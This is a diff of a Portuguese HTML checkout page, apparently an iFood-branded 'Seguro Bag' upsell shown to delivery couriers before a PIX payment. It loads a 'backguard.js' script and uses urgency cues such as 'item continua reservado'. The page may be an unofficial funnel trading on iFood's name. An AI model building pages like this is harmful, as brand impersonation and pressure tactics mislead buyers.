@@ -1,96 +1,102 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#EA1D2C">
-    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
-    <title>iFood Entregador - Seguro Bag</title>
-    <meta name="description" content="Proteja sua bag com o Seguro Bag por apenas R$ 9,90/mês.">
+    <title>iFood Entregador - Proteção extra</title>
+    <meta name="description" content="Escolha se deseja adicionar o Seguro Bag antes de finalizar seu pagamento.">
+    <script>
+        try {
+            if (sessionStorage.getItem('ifoodbag.orderbumpIntro') === '1') {
+                document.documentElement.classList.add('orderbump-intro-pending');
+            }
+        } catch (_error) {}
+    </script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=3.2">
-    <script src="/backguard.js?v=1.5"></script>
+    <link rel="stylesheet" href="orderbump.css?v=3">
+    <script src="/backguard.js?v=1.6"></script>
 </head>
-
 <body data-page="orderbump">
-
+    <div id="orderbump-intro" class="orderbump-intro" aria-hidden="true">
+        <div class="orderbump-intro__content">
+            <img src="assets/ifoodentregadores-wink-v1.svg" alt="">
+            <span class="orderbump-intro__line"><strong>Promoção de Seguro Bag liberada</strong></span>
+            <span class="orderbump-intro__loader"><i></i></span>
+        </div>
+    </div>
     <header class="header">
         <div class="logo-container">
             <img src="assets/ifoodentregadores-wink-v1.svg" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
         </div>
     </header>
-
     <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
-
     <main class="container">
         <section class="step bump-step" aria-hidden="false">
-            <div class="badge-container">
-                <span class="badge">Seguro Bag</span>
-            </div>
-
-            <h2 class="bump-title">Proteja sua bag por apenas <span id="bump-monthly">R$ 9,90</span>/mês</h2>
-            <p class="bump-subtitle">Cobertura contra roubo, rasgos e danos. Troca garantida sempre que precisar.</p>
-
-            <div class="bump-hero">
-                <img src="assets/seguro-bag.png" alt="Seguro Bag iFood">
-            </div>
-
-            <div class="bump-card">
-                <div class="bump-item">
-                    <span class="bump-icon">✔</span>
-                    <div>
-                        <strong>Cobertura completa</strong>
-                        <span>Roubo, rasgos e desgaste do dia a dia.</span>
-                    </div>
-                </div>
-                <div class="bump-item">
-                    <span class="bump-icon">✔</span>
-                    <div>
-                        <strong>Troca rápida</strong>
-                        <span>Substituição sem burocracia quando precisar.</span>
-                    </div>
-                </div>
-                <div class="bump-item">
-                    <span class="bump-icon">✔</span>
-                    <div>
-                        <strong>Cancelamento livre</strong>
-                        <span>Você pode cancelar quando quiser.</span>
-                    </div>
+            <div class="step-header bump-progress">
+                <span class="step-count">Última escolha</span>
+                <div class="progress-bar" role="progressbar" aria-label="Etapas concluídas" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100">
+                    <div class="progress" style="width: 100%"></div>
                 </div>
             </div>
-
-            <div class="bump-total">
-                Total com seguro: <strong id="bump-total">R$ 0,00</strong>
-            </div>
-
-            <div class="action-stack">
-                <button id="btn-bump-accept" class="btn-primary" type="button">Quero proteger minha bag</button>
-                <button id="btn-bump-decline" class="btn-secondary" type="button">Não, continuar sem seguro</button>
-            </div>
-
-            <div id="bump-loading" class="inline-loading hidden" aria-hidden="true">
-                <div class="spinner spinner--sm" aria-hidden="true"></div>
-                <span>Gerando pagamento...</span>
+            <div class="bump-layout">
+                <div class="bump-story">
+                    <div class="bump-copy">
+                        <span class="bump-kicker">
+                            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2 4 5v6c0 5.1 3.4 9.8 8 11 4.6-1.2 8-5.9 8-11V5l-8-3Zm-1 14-3.5-3.5 1.4-1.4 2.1 2.1 4.6-4.6 1.4 1.4-6 6Z"/></svg>
+                            Proteção opcional
+                        </span>
+                        <h1>Proteção para sua rotina, sem complicação</h1>
+                        <p>Adicione por R$ 9,90/mês ou siga sem o seguro. Sua reserva continua garantida.</p>
+                    </div>
+                    <div class="bump-visual" aria-label="Bag vermelha com proteção extra">
+                        <span class="bump-visual__glow" aria-hidden="true"></span>
+                        <span class="bump-visual__eyebrow">Proteção para sua bag</span>
+                        <span class="bump-price-float"><small>Seguro Bag</small><strong id="bump-monthly">R$ 9,90</strong><em>/mês</em></span>
+                        <span class="bump-shield" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 2 4 5v6c0 5.1 3.4 9.8 8 11 4.6-1.2 8-5.9 8-11V5l-8-3Zm-1 14-3.5-3.5 1.4-1.4 2.1 2.1 4.6-4.6 1.4 1.4-6 6Z"/></svg></span>
+                        <img src="assets/bag-seguro-premium-v1.png" alt="Bag térmica vermelha do iFood, nova e protegida">
+                        <span class="bump-visual__shadow" aria-hidden="true"></span>
+                    </div>
+                    <div class="bump-benefits" aria-label="Benefícios do Seguro Bag">
+                        <div class="bump-benefit"><span aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 2 3 6v6c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V6l-9-4Zm0 3 6 2.7V12c0 3.5-2.5 7-6 8-3.5-1-6-4.5-6-8V7.7L12 5Z"/></svg></span><div><strong>Cobertura extra</strong><small>Para roubo e danos previstos</small></div></div>
+                        <div class="bump-benefit"><span aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M7 7h8.6l-2.3-2.3L14.7 3l5.3 5.3-5.3 5.3-1.4-1.7L15.6 10H7a3 3 0 0 0 0 6h2v3H7A6 6 0 0 1 7 7Zm10 10H8.4l2.3 2.3L9.3 21 4 15.7l5.3-5.3 1.4 1.7L8.4 14H17a3 3 0 0 0 0-6h-2V5h2a6 6 0 0 1 0 12Z"/></svg></span><div><strong>Troca simplificada</strong><small>Atendimento sem complicação</small></div></div>
+                        <div class="bump-benefit"><span aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2Zm1 11H7v-2h4V6h2v7Z"/></svg></span><div><strong>Você no controle</strong><small>Cancele quando quiser</small></div></div>
+                    </div>
+                </div>
+                <aside class="bump-decision" aria-label="Adicionar Seguro Bag">
+                    <div class="bump-reserved"><i aria-hidden="true"></i>Seu item continua reservado</div>
+                    <div class="bump-decision__heading">
+                        <span>Oferta antes do pagamento</span>
+                        <h2>Adicionar Seguro Bag?</h2>
+                        <p>Escolha opcional. Decida e avance para o PIX.</p>
+                    </div>
+                    <div class="bump-order-item">
+                        <span class="bump-order-item__media"><img id="bump-item-image" src="assets/bagfoto.webp" alt="Bag do iFood"></span>
+                        <div><small>Item reservado</small><strong id="bump-item-name">Bag do iFood</strong></div>
+                        <svg class="bump-order-item__check" viewBox="0 0 24 24" aria-hidden="true"><path d="m9.2 16.6-4.3-4.3 1.8-1.8 2.5 2.5 7.9-7.9 1.8 1.8-9.7 9.7Z"/></svg>
+                    </div>
+                    <div class="bump-price-box">
+                        <div><span>Pedido atual</span><strong id="bump-base-total">R$ 0,00</strong></div>
+                        <div class="bump-price-box__insurance"><span>Seguro Bag <small>mensal</small></span><strong>+ R$ 9,90</strong></div>
+                        <div class="bump-price-box__total"><span>Total de hoje</span><strong id="bump-total">R$ 0,00</strong></div>
+                    </div>
+                    <div class="action-stack bump-actions">
+                        <button id="btn-bump-accept" class="btn-primary" type="button"><span>Sim, adicionar proteção</span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m13.2 5 7 7-7 7-1.4-1.4 4.6-4.6H4v-2h12.4l-4.6-4.6L13.2 5Z"/></svg></button>
+                        <button id="btn-bump-decline" class="btn-secondary" type="button">Continuar sem o Seguro Bag</button>
+                    </div>
+                    <div id="bump-loading" class="inline-loading hidden" aria-hidden="true"><div class="spinner spinner--sm" aria-hidden="true"></div><span>Gerando seu PIX com segurança...</span></div>
+                    <p class="bump-fineprint"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 1 1 4 0v2h-4V7Z"/></svg>Pagamento seguro. Sua decisão será confirmada antes de gerar o PIX.</p>
+                </aside>
             </div>
         </section>
     </main>
-
     <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
-
-    <footer class="footer">
-        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
-    </footer>
-
-    <script src="script.js?v=10.9" defer></script>
+    <footer class="footer"><p>&copy; 2026 iFood. Todos os direitos reservados.</p></footer>
+    <script src="script.js?v=11.3" defer></script>
 </body>
-
 </html>
-
-
-
-
